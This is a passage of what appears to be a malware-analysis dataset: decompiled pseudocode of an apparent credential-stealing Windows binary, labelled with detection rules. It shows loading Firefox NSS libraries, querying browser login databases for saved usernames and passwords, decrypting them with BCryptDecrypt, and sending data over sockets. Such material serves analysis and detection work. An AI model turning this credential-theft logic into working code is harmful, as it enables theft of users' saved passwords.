fcn.00401085(0x1303d0);\n        var_14h = pcVar4;\n        var_10h = fcn.00401085(0x235d0);\n        var_4h = fcn.00401085(0x14748);\n        fcn.0040102c(var_ch, var_1ch, 0x519d0);\n        fcn.0040102c(var_8h, var_1ch + 0x519d0, 0x217d0);\n        fcn.0040102c(pszPath, var_1ch + 0x731a0, 0x6b738);\n        fcn.0040102c(pcVar4, var_1ch + 0xde8d8, 0x1303d0);\n        fcn.0040102c(var_10h, var_1ch + 0x20eca8, 0x235d0);\n        fcn.0040102c(var_4h, var_1ch + 0x232278, 0x14748);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathW;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x100, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_SetDllDirectoryW)(&lpPathName);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"softokn3.dll\");\n        (*pcVar1)(0x100, &var_428h);\n        (*pcVar2)(&var_428h, L\"msvcp140.dll\");\n        (*pcVar1)(0x100, &var_828h);\n        (*pcVar2)(&var_828h, L\"mozglue.dll\");\n        (*pcVar1)(0x100, &var_628h);\n        (*pcVar2)(&var_628h, L\"vcruntime140.dll\");\n        (*pcVar1)(0x100, &var_c28h);\n        (*pcVar2)(&var_c28h, L\"freebl3.dll\");\n        (*pcVar1)(0x100, &var_a28h);\n        (*pcVar2)(&var_a28h, L\"nss3.dll\");\n        pcVar3 = var_ch;\n        pcVar4 = var_14h;\n        if (((var_10h != NULL) && (pszPath != NULL)) &&\n           ((var_8h != NULL && (((var_4h != NULL && (var_ch != NULL)) && (var_14h != NULL)))))) {\n            if ((*var_10h == 'M') && (var_10h[1] == 'Z')) {\n                fcn.004133f9(0x235d0);\n            }\n            if ((*pszPath == 'M') && (pszPath[1] == 'Z')) {\n                fcn.004133f9(0x6b738);\n            }\n            if ((*var_8h == 'M') && (var_8h[1] == 'Z')) {\n                fcn.004133f9(0x217d0);\n            }\n            if ((*var_4h == 'M') && (var_4h[1] == 'Z')) {\n                fcn.004133f9(0x14748);\n            }\n            if ((*pcVar3 == 'M') && (pcVar3[1] == 'Z')) {\n                fcn.004133f9(0x519d0);\n            }\n            if ((*pcVar4 == 'M') && (pcVar4[1] == 'Z')) {\n                fcn.004133f9(0x1303d0);\n            }\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(&var_428h);\n        *(in_ECX + 0xac) = uVar7;\n        uVar7 = (*pcVar1)(&var_628h);\n        *(in_ECX + 0xbc) = uVar7;\n        uVar7 = (*pcVar1)(&var_828h);\n        *(in_ECX + 0xb0) = uVar7;\n        uVar7 = (*pcVar1)(&var_a28h);\n        *(in_ECX + 0xb4) = uVar7;\n        uVar7 = (*pcVar1)(&lpPathName);\n        *(in_ECX + 0xb8) = uVar7;\n        uVar7 = (*pcVar1)(&var_c28h);\n        *(in_ECX + 0xa4) = uVar7;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        fcn.00403148();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(arg_8h);\n        fcn.0040357c(0x4176a4);\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"nss3.dll\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"msvcr120.dll\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"msvcp120.dll\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"mozglue.dll\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"softokn3.dll\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"vcruntime140.dll\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"msvcp\");\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(L\"msvcr\");\n        iVar5 = 0x5a;\n        var_20h = 0x5a;\n        do {\n            fcn.0040373f(&var_28h);\n            uVar7 = 0x418718;\n            iVar6 = iVar5;\n            fcn.00403384(iVar5);\n            fcn.0040357c(iVar6);\n            iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar6, uVar7);\n            if (iVar6 != 0) {\n                fcn.00403549(&pszPath);\n                fcn.00405feb();\n                break;\n            }\n            iVar5 = iVar5 + 10;\n            fcn.00405feb();\n            pszPath = NULL;\n        } while (iVar5 != 0x96);\n        iVar5 = 0x5a;\n        do {\n            fcn.0040373f(&var_24h);\n            uVar7 = 0x418718;\n            fcn.00403384(iVar5);\n            fcn.0040357c(iVar5);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar5, uVar7);\n            if (iVar5 != 0) {\n                fcn.00403549(&pszPath);\n                fcn.00405feb();\n                break;\n            }\n            var_20h = var_20h + 10;\n            fcn.00405feb();\n            pszPath = NULL;\n            iVar5 = var_20h;\n        } while (var_20h != 0x96);\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_18h);\n        *(in_ECX + 0xbc) = uVar7;\n        uVar7 = (*pcVar1)(var_8h);\n        *(in_ECX + 0xa8) = uVar7;\n        uVar7 = (*pcVar1)(var_4h);\n        *(in_ECX + 0xac) = uVar7;\n        uVar7 = (*pcVar1)(var_ch);\n        *(in_ECX + 0xb0) = uVar7;\n        uVar7 = (*pcVar1)(var_10h);\n        *(in_ECX + 0xb4) = uVar7;\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n    }\n    if (*(in_ECX + 0xb4) == 0) {\n        uVar7 = 0;\n    }\n    else {\n        uVar7 = fcn.00411e88(*(in_ECX + 0xb4));\n        *(in_ECX + 0x68) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x80) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x7c) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x70) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x74) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x78) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x6c) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x84) = uVar7;\n        uVar7 = fcn.00411e88();\n        *(in_ECX + 0x88) = uVar7;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        uVar7 = 1;\n    }\ncode_r0x0040b86c:\n    fcn.00405feb();\n    return uVar7;\n}\n",
        "token_count": 2891
    },
    "0040bc0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bc0d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint noname_0;\n    uint hKey;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_14h = 0;\n    var_18h = 0;\n    var_30h = in_ECX;\n    fcn.00410c8a();\n    fcn.0040357c(0x4176a4);\n    uVar2 = fcn.004035b9();\n    fcn.00403447(uVar2);\n    fcn.00405feb();\n    fcn.0040357c(L\".tmp\");\n    fcn.00410c8a();\n    fcn.0040357c(0x4176a4);\n    uVar2 = fcn.004035b9();\n    fcn.00403447(uVar2);\n    fcn.00405feb();\n    fcn.0040357c(L\".tmp\");\n    uVar2 = fcn.00410c8a();\n    fcn.00403549(uVar2);\n    fcn.00405feb();\n    fcn.0040357c(arg_8h);\n    uVar2 = fcn.00410c8a();\n    fcn.00403549(uVar2);\n    fcn.00405feb();\n    fcn.0040357c(arg_ch);\n    pcVar1 = _sym.imp.SHLWAPI.dll_PathFileExistsW;\n    iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(var_14h);\n    uVar2 = var_18h;\n    if ((((iVar3 != 0) && (iVar3 = (*pcVar1)(var_18h),  pcVar1 = _sym.imp.KERNEL32.dll_CopyFileW,  iVar3 != 0)) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_CopyFileW)(var_14h, var_8h, 0),  iVar3 != 0)) &&\n       (iVar3 = (*pcVar1)(uVar2, var_10h, 0),  iVar3 != 0)) {\n        fcn.00403549(&var_8h);\n        puVar4 = fcn.00403666(&arg_10h);\n        iVar3 = (**(in_ECX + 0x30))(*puVar4, &var_34h);\n        fcn.00405feb();\n        if (iVar3 == 0) {\n            var_1ch = 0;\n            arg_ch = 0;\n            iVar5 = fcn.0040c63e(noname_0, noname_0, &var_1ch, &arg_ch);\n            iVar3 = in_ECX;\n            if (iVar5 != 0) {\n                pcVar6 = \"select signon_realm, origin_url, username_value, password_value from logins\";\n                if (arg_14h != '\\0') {\n                    pcVar6 = \"select signon_realm, origin_url, username_value, password_value from wow_logins\";\n                }\n                iVar5 = (**(in_ECX + 0x38))(var_34h, pcVar6, 0xffffffff, &var_ch, 0);\n                if (iVar5 == 0) {\n                    iVar5 = (**(in_ECX + 0x44))(var_ch);\n                    while (iVar5 == 100) {\n                        arg_14h = fcn.00405f68();\n                        fcn.00405f68();\n                        var_2ch = fcn.00405f68();\n                        arg_10h = fcn.00405f68();\n                        pcVar6 = (**(in_ECX + 0x40))(var_ch, 0);\n                        if (*pcVar6 != '\\0') {\n                            uVar2 = fcn.004034d1(pcVar6);\n                            fcn.00403237(uVar2);\n                            fcn.00405feb();\n                        }\n                        pcVar6 = (**(in_ECX + 0x40))(var_ch, 1);\n                        if (*pcVar6 != '\\0') {\n                            uVar2 = fcn.004034d1(pcVar6);\n                            fcn.00403237(uVar2);\n                            fcn.00405feb();\n                        }\n                        pcVar6 = (**(in_ECX + 0x40))(var_ch, 2);\n                        if (*pcVar6 != '\\0') {\n                            uVar2 = fcn.004034d1(pcVar6);\n                            fcn.00403237(uVar2);\n                            fcn.00405feb();\n                        }\n                        uVar2 = var_1ch;\n                        hKey = arg_ch;\n                        (**(in_ECX + 0x5c))(var_ch, 3);\n                        (**(in_ECX + 0x54))(var_ch, 3);\n                        uVar2 = fcn.0040c6bd(uVar2, hKey);\n                        uVar2 = fcn.004034d1(uVar2);\n                        fcn.00403237(uVar2);\n                        fcn.00405feb();\n                        iVar3 = fcn.0040319e();\n                        if ((0 < iVar3) || (iVar3 = fcn.0040319e(),  0 < iVar3)) {\n                            var_54h = 0;\n                            var_50h = 0;\n                            var_4ch = 0;\n                            iVar3 = fcn.0040319e();\n                            if (0 < iVar3) {\n                                uVar2 = fcn.004031af(&var_20h);\n                                fcn.00403549(uVar2);\n                                fcn.00405feb();\n                                var_20h = 0;\n                            }\n                            iVar3 = fcn.0040319e();\n                            if (0 < iVar3) {\n                                uVar2 = fcn.004031af(&var_24h);\n                                fcn.00403549(uVar2);\n                                fcn.00405feb();\n                                var_24h = 0;\n                            }\n                            iVar3 = fcn.0040319e();\n                            if (iVar3 != 0) {\n                                uVar2 = fcn.004031af(&var_28h);\n                                fcn.00403549(uVar2);\n                                fcn.00405feb();\n                                var_28h = 0;\n                            }\n                            var_48h = arg_18h;\n                            puVar4 = &var_54h;\n                            fcn.00401ff2(puVar4);\n                            fcn.00402028(puVar4);\n                            fcn.00401441();\n                        }\n                        fcn.00405feb();\n                        fcn.00405feb();\n                        fcn.00405feb();\n                        fcn.00405feb();\n                        iVar5 = (**(in_ECX + 0x44))(var_ch);\n                        iVar3 = var_30h;\n                    }\n                    if (iVar5 != 0) goto code_r0x0040bd6b;\n                }\n            }\n            uVar2 = 1;\n            (**(iVar3 + 0x60))(var_ch);\n            (**(iVar3 + 0x34))(var_34h);\n            puVar4 = &var_8h;\n            fcn.0040373f(puVar4);\n            fcn.0041142a(puVar4);\n            puVar4 = &var_10h;\n            fcn.0040373f(puVar4);\n            fcn.0041142a(puVar4);\n            goto code_r0x0040bd8f;\n        }\ncode_r0x0040bd6b:\n        puVar4 = &var_8h;\n        fcn.0040373f(puVar4);\n        fcn.0041142a(puVar4);\n        puVar4 = &var_10h;\n        fcn.0040373f(puVar4);\n        fcn.0041142a(puVar4);\n    }\n    uVar2 = 0;\ncode_r0x0040bd8f:\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    return uVar2;\n}\n",
        "token_count": 1998
    },
    "0040c5e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c5e8(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (param_1 != 0) {\n        if (*(param_1 + 0x30) != 0) {\n            (*_sym.imp.KERNEL32.dll_LocalFree)(*(param_1 + 0x30));\n        }\n        if (*(param_1 + 0x40) != 0) {\n            (*pcVar1)(*(param_1 + 0x40));\n        }\n        if (*(param_1 + 0x48) != 0) {\n            (*pcVar1)(*(param_1 + 0x48));\n        }\n        if (*(param_1 + 0x58) != 0) {\n            (*pcVar1)(*(param_1 + 0x58));\n        }\n        if (*(param_1 + 0x60) != 0) {\n            (*pcVar1)(*(param_1 + 0x60));\n        }\n        if (*(param_1 + 0x68) != 0) {\n            (*pcVar1)(*(param_1 + 0x68));\n        }\n        (*pcVar1)(param_1);\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "0040c6bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c6bd(int32_t arg_8h, int32_t hKey)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint32_t in_EDX;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t pbInput;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_10h;\n    int32_t cbInput;\n    uint var_8h;\n    \n    var_8h._0_2_ = 0x3176;\n    var_8h._2_1_ = 0x30;\n    if (2 < in_EDX) {\n        in_stack_ffffff88 = 0x40c6e9;\n        iVar1 = fcn.00401000(in_ECX, &fcn.0040c6bd::var_8h, 3);\n        if (iVar1 == 0) {\n            if (arg_8h == 0) {\n                return 0;\n            }\n            if (hKey == 0) {\n                return 0;\n            }\n            fcn.00401052(&fcn.0040c6bd::var_54h, 0, 0x40);\n            var_4ch = in_ECX + 3;\n            var_54h = 0x40;\n            var_50h = 1;\n            var_3ch = (in_EDX - 0x10) + in_ECX;\n            pbInput = 0xc;\n            cbInput = in_EDX - 0x1f;\n            var_38h = 0x10;\n            var_10h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, cbInput);\n            if (var_10h == 0) {\n                return 0;\n            }\n            iVar1 = (*_sym.imp.bcrypt.dll_BCryptDecrypt)\n                              (hKey, var_4ch + pbInput, cbInput, &fcn.0040c6bd::var_54h, 0, 0, var_10h, cbInput, \n                               &fcn.0040c6bd::cbInput, 0);\n            if (iVar1 != 0) {\n                return 0x418fe6;\n            }\n            arg_8h_00 = fcn.00401085(cbInput + 1);\n            fcn.00401052(arg_8h_00, 0, cbInput + 1);\n            fcn.0040102c(arg_8h_00, var_10h, cbInput);\n            goto code_r0x0040c7fb;\n        }\n    }\n    iVar1 = fcn.0040c1dd(in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, in_stack_ffffff88, \n                         &fcn.0040c6bd::var_10h, &fcn.0040c6bd::cbInput);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    arg_8h_00 = fcn.00401085(cbInput + 1);\n    fcn.00401052(arg_8h_00, 0, cbInput + 1);\n    fcn.0040102c(arg_8h_00, var_10h, cbInput);\ncode_r0x0040c7fb:\n    (*_sym.imp.KERNEL32.dll_LocalFree)(var_10h);\n    return arg_8h_00;\n}\n",
        "token_count": 845
    },
    "0040d01d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d01d(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint hostshort;\n    uint uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = in_ECX + 0xf6;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    uVar4 = extraout_ECX;\n    if (in_ECX[0x7b] == 0) {\n        uVar6 = *(arg_8h + 0xc);\n        iVar5 = arg_8h + 8;\n        hostshort = extraout_ECX;\n        fcn.00403507(iVar5);\n        iVar3 = fcn.0040594b(iVar5, hostshort);\n        uVar4 = extraout_ECX_00;\n        if (iVar3 != 0) goto code_r0x0040d05e;\ncode_r0x0040d07c:\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1, iVar5, hostshort, uVar6);\n        uVar4 = 1;\n    }\n    else {\ncode_r0x0040d05e:\n        if (in_ECX[3] == 0) {\n            uVar6 = *(arg_8h + 4);\n            fcn.00403507(arg_8h);\n            iVar3 = fcn.0040594b(arg_8h, uVar4);\n            iVar5 = arg_8h;\n            hostshort = uVar4;\n            if (iVar3 == 0) goto code_r0x0040d07c;\n        }\n        iVar5 = fcn.004021ed(0);\n        if (iVar5 == 0) {\n            fcn.00401f98();\n        }\n        iVar5 = fcn.004021ed(0);\n        if (iVar5 == 0) {\n            fcn.00401f98();\n        }\n        var_8h = in_ECX[4];\n        var_4h = in_ECX[0x7c];\n        fcn.00401f6d(fcn.0040cf43, &var_8h);\n        fcn.00401f6d(fcn.0040cfb0, &var_8h);\n        pcVar2 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n        *in_ECX = 1;\n        (*pcVar2)(puVar1);\n        fcn.004021ed(0xffffffff);\n        fcn.004021ed(0xffffffff);\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        *in_ECX = 0;\n        (*pcVar2)(puVar1);\n        fcn.0040d1c8();\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 679
    },
    "0040d14d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d14d(int32_t buf)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = buf;\n    if (buf == 0) {\ncode_r0x0040d183:\n        uVar2 = 0;\n    }\n    else {\n        do {\n            iVar1 = (*_sym.imp.WS2_32.dll_send)(in_ECX, (in_EDX - iVar3) + buf, iVar3, 0);\n            if (iVar1 == -1) goto code_r0x0040d183;\n            iVar3 = iVar3 - iVar1;\n        } while (iVar3 != 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 193
    },
    "0040d20c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d26c)\n\nvoid __cdecl fcn.0040d20c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t lpParameter;\n    uint hObject;\n    uint var_4h;\n    \n    *0x55ac34 = arg_8h;\n    lpParameter = fcn.00406045();\n    fcn.00403237(&arg_14h);\n    *(lpParameter + 4) = 0xd3d;\n    fcn.00403237(&arg_ch);\n    *(lpParameter + 0xc) = arg_10h;\n    *(lpParameter + 0x10) = 0x55a860;\n    fcn.00401f6d(fcn.0040d13a, lpParameter);\n    fcn.00405feb();\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 208
    },
    "0040d8fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d8fb(int32_t param_1)\n\n{\n    int32_t lpString2_00;\n    bool bVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint lpString1;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    bVar1 = false;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n    if (iVar2 != 0) {\n        lpString2_00 = param_1 + 0x28;\n        var_24h = 1;\n        do {\n            var_ch = 0;\n            (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)(iVar2, 0, 0x30, 3, 0, 0, &var_10h, &var_4h, &var_ch, 0);\n            uVar5 = var_10h;\n            piVar3 = fcn.00406045();\n            iVar4 = (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)\n                              (iVar2, 0, 0x30, 3, piVar3, uVar5, &var_10h, &var_4h, &var_ch, 0);\n            if ((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0xea)) break;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            uVar7 = 0;\n            piVar6 = piVar3;\n            if (var_4h == 0) break;\n            while( true ) {\n                if (*piVar6 == 0) goto code_r0x0040d9dc;\n                fcn.004036f7(*piVar6);\n                iVar2 = fcn.0040335a(lpString2_00);\n                if (iVar2 != 0) break;\n                fcn.00405feb();\n                lpString1 = 0;\n                uVar7 = uVar7 + 1;\n                piVar6 = piVar6 + 0xb;\n                if (var_4h <= uVar7) goto code_r0x0040d9dc;\n            }\n            uVar5 = fcn.004036f7(piVar3[uVar7 * 0xb]);\n            fcn.00403549(uVar5);\n            fcn.00405feb();\n            *(param_1 + 0x2c) = piVar3[uVar7 * 0xb + 9];\n            fcn.00405feb();\n            lpString1 = 0;\n            if (*(param_1 + 0x2c) != 0) {\n                uVar8 = 0;\n                uVar7 = var_4h;\n                if (var_4h == 0) goto code_r0x0040d9e0;\n                goto code_r0x0040da7d;\n            }\n            if (bVar1) break;\n            fcn.0040d33c(lpString2_00, 2);\n            fcn.0040d3a8(lpString2_00);\n            bVar1 = true;\n            fcn.00401099(piVar3);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n        } while (iVar2 != 0);\n    }\ncode_r0x0040d9dc:\n    var_24h = 0;\n    goto code_r0x0040d9e0;\n    while( true ) {\n        if (piVar3[9] == *(param_1 + 0x2c)) {\n            fcn.004036f7(*piVar3);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(lpString1, 0);\n            if (iVar2 != 0) {\n                iVar2 = *piVar3;\n                fcn.004036f7(iVar2);\n                fcn.0040221a(iVar2);\n            }\n            fcn.00405feb();\n            uVar7 = var_4h;\n        }\n        lpString1 = 0;\n        uVar8 = uVar8 + 1;\n        piVar3 = piVar3 + 0xb;\n        if (uVar7 <= uVar8) break;\ncode_r0x0040da7d:\n        lpString1 = 0;\n        if (*piVar3 == 0) break;\n    }\ncode_r0x0040d9e0:\n    fcn.00405feb();\n    return var_24h;\n}\n",
        "token_count": 1147
    },
    "0040dd72": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040dec2)\n// WARNING: Removing unreachable block (ram,0x0040ded1)\n// WARNING: Removing unreachable block (ram,0x0040dee9)\n// WARNING: Removing unreachable block (ram,0x0040def8)\n// WARNING: Removing unreachable block (ram,0x0040df10)\n\nuint __fastcall fcn.0040dd72(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint uVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    uint in_stack_ffffff58;\n    int32_t in_stack_ffffff70;\n    \n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar1 = fcn.00411177();\n    if (iVar1 == 1) {\n        fcn.00410cff();\n    }\n    iVar1 = param_1 + 0x38;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n    if (iVar2 == 0) {\n        uVar4 = extraout_ECX;\n        fcn.0040373f(iVar1);\n        fcn.00411722(iVar1, uVar4);\n        iVar1 = param_1 + 0x40;\n        iVar2 = extraout_ECX_00;\n        fcn.0040373f(iVar1);\n        fcn.00411722(iVar1, iVar2);\n        iVar1 = fcn.00411177();\n        if (iVar1 == 1) {\n            uVar4 = fcn.00415847(&stack0xffffff98, *(param_1 + 100), 2);\n            fcn.00402fce(uVar4);\n            fcn.00403148();\n            fcn.004030cc(0, 0x1c800);\n            uVar4 = 0x1c800;\n            iVar2 = iVar2 + -0x1c800;\n        }\n        else {\n            uVar4 = fcn.00415847(&stack0xffffff98, *(param_1 + 100), 1);\n            fcn.00402fce(uVar4);\n            fcn.00403148();\n            fcn.004030cc(0, 0x12e00);\n            uVar4 = 0x12e00;\n            iVar2 = iVar2 + -0x12e00;\n        }\n        fcn.004030cc(uVar4, iVar2);\n        fcn.00403148();\n        fcn.00403148();\n        fcn.0041140c();\ncode_r0x0040deb1:\n        fcn.0041140c();\n        uVar4 = 0xffffffff;\n    }\n    else {\n        iVar1 = param_1 + 0x3c;\n        puVar7 = &stack0xffffff68;\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n        if (iVar2 == 0) {\n            uVar3 = extraout_ECX_01;\n            fcn.0040373f(iVar1);\n            fcn.00411722(iVar1, uVar3);\n            in_stack_ffffff58 = 3;\n            fcn.00415847(&stack0xffffff7c, *(param_1 + 100), 3);\n            if (in_stack_ffffff70 == 0) {\n                fcn.00403148();\n                goto code_r0x0040deb1;\n            }\n            iVar1 = fcn.0041130f(extraout_ECX_02, extraout_ECX_02);\n            if (iVar1 != 0) {\n                uVar3 = extraout_ECX_03;\n                fcn.0041165c(&stack0xffffff68);\n                fcn.00411644(puVar7, uVar3);\n            }\n            fcn.00403148();\n            fcn.0041140c();\n        }\n        fcn.0040db52();\n        fcn.0040db39();\n        iVar1 = fcn.0040d8fb();\n        if (iVar1 == 0) {\n            fcn.00410cd8();\n            iVar1 = param_1 + 0x5c;\n            iVar2 = 4;\n        }\n        else {\n            iVar1 = fcn.0040d856();\n            if (iVar1 == 0) {\n                fcn.00410cd8();\n                iVar1 = param_1 + 0x60;\n                iVar2 = param_1 + 0x5c;\n                in_stack_ffffff58 = 6;\n            }\n            else {\n                fcn.0040dad6();\n                fcn.004036f7(L\"SeDebugPrivilege\");\n                (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                iVar1 = fcn.00410b38();\n                fcn.00405feb();\n                if (iVar1 == 0) {\n                    fcn.00410cd8();\n                    iVar1 = param_1 + 0x60;\n                    iVar2 = param_1 + 0x5c;\n                    in_stack_ffffff58 = 3;\n                }\n                else {\n                    iVar1 = fcn.0041229c();\n                    pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                    if (iVar1 == 0) {\n                        fcn.00410cd8();\n                        iVar1 = param_1 + 0x60;\n                        iVar2 = param_1 + 0x5c;\n                        in_stack_ffffff58 = 5;\n                    }\n                    else {\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                        if 